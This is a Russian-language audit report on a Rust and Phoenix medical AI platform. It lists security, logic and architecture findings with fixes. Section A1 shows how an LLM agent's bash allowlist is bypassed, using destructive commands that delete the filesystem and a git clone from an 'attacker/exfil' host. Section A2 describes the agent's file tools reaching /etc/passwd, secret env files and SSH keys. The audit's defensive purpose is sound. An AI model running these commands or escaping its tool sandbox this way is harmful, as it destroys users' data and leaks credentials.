Аудит охватывает Rust-core (6 крейтов) + Phoenix umbrella (4 app), созданные в этой сессии. Существующий Python-стек (`agents/*.py`, `medical_system.py`, `web/api.py` и т. д.) НЕ в скоупе — он пока работает параллельно.

## A. Безопасность

### A1 🔴 CRIT — `aim-generalist` bash whitelist обходится тривиально
`crates/aim-generalist/src/tools/bash_tool.rs:7-16` — whitelist allows `python`, `python3`, `cargo`, `find`, `git`. Каждый из них — vehicle для произвольного выполнения:
- `python -c "import shutil; shutil.rmtree('/')"` — нет шелл-метасимволов, head=python ALLOWED
- `find / -delete` — head=find ALLOWED, удаляет всё
- `cargo run --manifest-path /tmp/evil/Cargo.toml` — компилирует и запускает любой Rust
- `git clone https://attacker/exfil --upload-pack="rm -rf $HOME"` — ныне залатано в git, но шаблон опасен

**Fix:** убрать из whitelist всё, что принимает скрипты как аргументы (`python -c`, `python3 -c`, `cargo run`, `cargo build`, `mix run`, `elixir -e`). Запретить флаги `-c`, `-e`, `-delete`, `--exec`. Лучше — sandbox через `bwrap` / `nsjail`, читать-только rootfs, ограничения cgroups.

### A2 🔴 CRIT — `aim-generalist` read_file/write_file без sandbox
`crates/aim-generalist/src/tools/fs_tools.rs:15,37` — принимают любой абсолютный путь. Модель может прочесть `~/.aim_env`, `/etc/passwd`, перезаписать `~/.bashrc`, `~/.ssh/authorized_keys`.

**Fix:**
```rust
fn validate_path(path: &str) -> Result<PathBuf, String> {
    let base = std::env::var("AIM_GENERALIST_ROOT")
        .unwrap_or_else(|_| "/home/oem/Desktop/LongevityCommon/AIM/Patients".into());
    let abs = std::fs::canonicalize(path).map_err(|e| e.to_string())?;
    if !abs.starts_with(&base) { return Err("path outside sandbox".into()); }
    Ok(abs)
}
```
Также: запретить файлы вне списка расширений (`.md`, `.txt`, `.json`, `.csv`, `.py`, `.rs`, `.ex`).

### A3 🟠 HIGH — `read_file` UTF-8 panic
`fs_tools.rs:18` — `&s[..max_bytes]` режет по байтам. Для не-ASCII текста (грузинский, китайский, арабский) `max_bytes=64*1024` может попасть в середину UTF-8 char → panic в самом обработчике запроса, который рушит всю tokio task этого инструмента.

**Fix:** `s.char_indices().take_while(|(i,_)| *i < max_bytes).last()` или `truncate_at_char_boundary(&s, max_bytes)`.

### A4 🟠 HIGH — `aim_gateway` AuthToken не защищает от timing attack на lookup
`apps/aim_gateway/lib/aim_gateway_web/plugs/auth_token.ex:27` — `AimMemory.lookup_token(hash)` делает `Repo.get(AuthToken, hash)`. Для несуществующего токена возвращается быстрее, чем для существующего (нет touch). Можно перебирать токены по времени отклика. Маловероятно при SHA-256 (256 бит энтропии), но всё же.

**Fix:** имитировать одинаковую работу для miss-case, либо `Plug.Crypto.secure_compare` после получения hash из БД. Низкая срочность из-за длины токена (43 символа base64url), но добавить нужно.

### A5 🟡 MED — `aim-llm` нет защиты от prompt-leakage в логах
Все провайдеры отправляют `messages` целиком в HTTP body. При `RUST_LOG=trace` reqwest залогирует тело включая PII (`Patients/...` пути, диагнозы). Проблема — `tracing` middleware `tower-http` может писать тело.

**Fix:** не включать `tracing-subscriber` в trace по умолчанию, добавить redaction для известных полей (`messages[].content`).

### A6 🟡 MED — Phoenix `secret_key_base` пустой в `dev.exs`
`config/config.exs:8,16` — `secret_key_base: "REPLACE_VIA_RUNTIME_EXS"` буквально, а `runtime.exs` срабатывает только в prod. В dev сессии сразу подписываются плейсхолдером — если случайно запустим `MIX_ENV=dev` на публичном порту, любой может подделать сессию.

**Fix:** `:dev` тоже читать из ENV, либо генерировать рандом при старте.

### A7 🟡 MED — Telegram `Task.start` без супервизора
`apps/aim_gateway/lib/aim_gateway_web/controllers/telegram_controller.ex:13` — `Task.start(fn -> handle_update(params) end)` создаёт unsupervised task. Если task упадёт, никто не узнает; если их накопится тысячи — память течёт.

**Fix:** `Task.Supervisor` зарегистрировать в `aim_gateway/application.ex`, использовать `Task.Supervisor.start_child(AimGateway.TaskSup, fn -> ... end)`.

### A8 🔵 LOW — `aim-medkb` interactions endpoint — нет ограничения числа лекарств
`crates/aim-medkb/src/main.rs:142` — `Vec<String>` без лимита. Атакующий шлёт 10000 названий → O(n²) перебор пар = 50M итераций. Не критично (in-memory, без I/O), но реальный DOS возможен.

**Fix:** `if raw.len() > 50 { return Err(BadRequest); }`.

## B. Логика и алгоритмы

### B1 🔴 CRIT — `aim-llm` model_hint не выбирает провайдера
`crates/aim-llm/src/router.rs:58-62` — `find(|p| p.is_ready())` берёт ПЕРВОГО ready провайдера независимо от `model_hint`. Если запросили `model_hint="gemini-2.5-pro"`, но первым в списке стоит DeepSeek → отправит `"gemini-2.5-pro"` в DeepSeek API → 400/404.

**Fix:** model→provider routing таблица или явный аргумент `provider`. Также добавить tier-chain из CLAUDE.md (`ask_critical: Claude → Gemini → DS-pro → Ollama`).

### B2 🟠 HIGH — `aim-llm` нет fallback / retry
Один провайдер упал → весь запрос фейлится. CLAUDE.md явно говорит: tier-chain с автоматическим переключением. Сейчас нет.

**Fix:** обернуть `provider.complete()` в loop по упорядоченному списку, пробовать следующего при 5xx/таймауте.

### B3 🟠 HIGH — `aim-llm` Anthropic пустые messages после partition
`crates/aim-llm/src/providers/anthropic.rs:43-45` — если все messages являются `system`, `msgs` пуст, Anthropic API вернёт `400: messages cannot be empty`. Не обрабатывается клиент-сайд.

**Fix:** если msgs пустой, добавить `{"role":"user","content":"continue"}`.

### B4 🟠 HIGH — `aim-llm` Gemini нарушает alternation
`crates/aim-llm/src/providers/gemini.rs:50` — маппит `system` → `user`. Если в messages идут `[system, user]`, после маппинга получается `[user, user]` — Gemini требует строгого чередования `user/model`.

**Fix:** объединять подряд идущие `user` в одно сообщение, либо отправлять system как отдельный `systemInstruction` (поддерживается Gemini API).

### B5 🟠 HIGH — `aim-doctor` swallowed errors на upstream
`crates/aim-doctor/src/main.rs:141-145, 148-158` — DiffDx/SSA ответы парсятся через `r.json::<Value>().await.unwrap_or(json!({}))`. Если diffdx вернёт 500, мы получаем пустой JSON и продолжаем с пустыми differentials. Пользователь увидит «план» сделанный без знания о дифдиагнозах — silent degradation.

**Fix:** `error_for_status()`, на ошибку — записать `{"error": ...}` в differentials и предупредить LLM в контексте.

### B6 🟡 MED — `aim-rag` cosine load-all ограничен по масштабу
`crates/aim-rag/src/store.rs:47-71` — каждый `/v1/search` загружает ВСЕ векторы из SQLite в память. Для 100k × 768f32 = 300MB. Mutex на `Connection` сериализует все запросы.

**Fix:** короткосрочно — ProtoArc<Vec<(id, vec)>> кэш в памяти, инвалидируется при upsert. Долгосрочно — `sqlite-vec` extension, или `usearch`/`hnsw_rs`.

### B7 🟡 MED — `aim-rag` Gemini batch последовательный
`crates/aim-rag/src/embed.rs:51-56` — для batch из N текстов делает N последовательных HTTP-запросов. Для embed 1000 chunks при 200ms latency = 200 секунд.

**Fix:** `futures::stream::iter(texts).buffer_unordered(8).collect()` для concurrent с лимитом.

### B8 🟡 MED — `aim_memory` `expired?` принимает невалидные ISO как «не истёк»
`apps/aim_memory/lib/aim_memory.ex:121-128` — для строки которая не парсится как ISO8601, возвращает `false` ⇒ токен валиден. Если миграция/ручной insert внесла «2026-12-31» (без времени) — токен бессмертен.

**Fix:** на парс-фейле либо логировать и считать истёкшим, либо `validate_format` в changeset.

### B9 🟡 MED — `aim-doctor` `extract_json` extracts largest balanced `{}`
`crates/aim-doctor/src/main.rs:182-208` — берёт самый длинный balanced substring. Если LLM выдал `{ "thought": "..." } { "result": ... }` — возьмёт `result`. Но если выдал ` } { "noise": 1 } { "real": "..." }` — может неверно угадать. Edge.

**Fix:** добавить попытку поиска по ключам `chief_complaint` и т. д. перед выбором по длине.

### B10 🟡 MED — `aim-medkb` синонимы не покрывают brand-name
Импортировано 22 синонима. Real-world: `Lipitor`, `Crestor`, `Plavix`, `Glucophage` (есть), `Norvasc` — покрытия мало. Отсутствие в синонимах = `severity="no_known"` хотя пара может быть в `_TABLE`.

**Fix:** прокачать synonyms из RxNorm экспорта; долгосрочно — RxNav API.

### B11 🟡 MED — `aim-doctor` контекст `case_id` не используется
`crates/aim-doctor/src/main.rs:113-118` — `DiagnoseReq.intake` приходит как уже-готовый JSON. Нет хранения case → невозможно `POST /intake` потом `POST /diagnose case_id`. Сейчас вызывающий должен сам помнить intake. Несоответствие изначальному дизайну.

**Fix:** добавить in-memory `DashMap<case_id, intake>` или хранить через `aim_memory` (через HTTP — но aim_memory это Elixir библиотека, не сервис; тогда aim-doctor нужен SQLite напрямую).

### B12 🔵 LOW — `aim_web` ChatLive race на быстром вводе
`apps/aim_web/lib/aim_web_web/live/chat_live.ex:18-23` — `phx-change="update"` шлёт каждое нажатие. На медленной сети возможны out-of-order. Минор, busy? защищает от дублирования send.

### B13 🔵 LOW — `aim-generalist` ReAct контекст растёт без bounds
`crates/aim-generalist/src/react.rs:88-114` — каждый шаг добавляет 2 message, нет компактирования старых tool_results. На 8 итерациях с большими read_file вылезет за context window.

**Fix:** при `messages.len() > N` сжать старые результаты через `aim-llm` summarisation.

### B14 🔵 LOW — clippy warnings (3 штуки)
Все косметические:
- `crates/aim-doctor/src/main.rs:200` `map_or` → `is_none_or`
- `crates/aim-rag/src/store.rs:47` complex type alias
- `crates/aim-rag/src/main.rs:74` redundant closure
- `crates/aim-generalist/src/react.rs:168` `map_or` → `is_none_or`
- `crates/aim-generalist/src/main.rs:76` redundant closure

**Fix:** `cargo clippy --fix --allow-dirty`.

### B15 🔵 LOW — `cargo fmt` 50+ диффов
Не запускали `cargo fmt` после первой генерации. Не блокирующе.

## C. Архитектурные пробелы

### C1 🟠 HIGH — Нет общего конфига для портов / URL
Каждый Rust-сервис читает свои `AIM_*_PORT` / `AIM_*_URL` независимо. Phoenix отдельно. Нет одного источника. Перенос между dev/staging/prod = редактирование 12+ переменных.

**Fix:** единый `aim.toml` (или `.aim_env` секцию `[ports]`) который читают и Rust, и Phoenix.

### C2 🟠 HIGH — Нет supervision для Rust-сервисов
Если `aim-llm` падает, ничто не перезапускает. systemd unit-файлов нет. На prod нужна оркестрация (systemd, docker-compose, runit).

**Fix:** написать `deploy/systemd/*.service` для каждого крейта; либо `deploy/docker-compose.yml` с restart=always.

### C3 🟠 HIGH — Нет миграции данных из текущего Python-стека
Python AIM в `aim.db` уже хранит patient data (хотя сейчас row counts по основным таблицам = 0). Новый Phoenix `aim_memory` смотрит на ту же `aim.db` — это ОК. Но если в Python пишутся специфические колонки (`role` строки кроме `user/assistant/system/tool`), `Message.changeset` отвергнет.

**Fix:** проверить продолжительный run Python со сборкой реальных messages, потом сверить с `validate_inclusion(:role, ~w(user assistant system tool))` — расширить список если нужно.

### C4 🟠 HIGH — Нет тестов
Нет ни одного unit/integration теста ни в Rust, ни в Phoenix. `cargo test` = 0 tests, `mix test` = 0 tests. Регрессии будут невидимы.

**Fix:** базовые тесты:
- `aim-medkb`: pair lookup, синонимы, severity_max
- `aim-llm` extract_json: edge cases
- `aim-rag` cosine: identity, orthogonal vectors
- `aim_memory` token roundtrip
- `aim_web` HTTP smoke (ConnTest)

### C5 🟡 MED — Phoenix umbrella стартует Endpoints, но Repo не запущен в Web/Gateway
Только `aim_memory` запускает `Repo`. `aim_web/aim_gateway` через `in_umbrella: true` будут работать с уже запущенным Repo, но если запускать только `mix run --no-start -e 'AimGateway.Application.start...'` — порядок важен.

**Fix:** проверить, что `mix phx.server` поднимает все 4 app в правильном порядке (по умолчанию umbrella сортирует deps — должно работать).

### C6 🟡 MED — `AimOrchestrator.Telegram` без реальной валидации chat shape
`apps/aim_orchestrator/lib/aim_orchestrator/telegram.ex` — нет валидации, что bot token имеет правильный формат, нет проверки на rate limits Telegram (30 msg/sec).

### C7 🔵 LOW — Документация неполна
README у каждого крейта/app есть, но нет ARCHITECTURE.md, нет sequence diagrams, нет описания deployment.
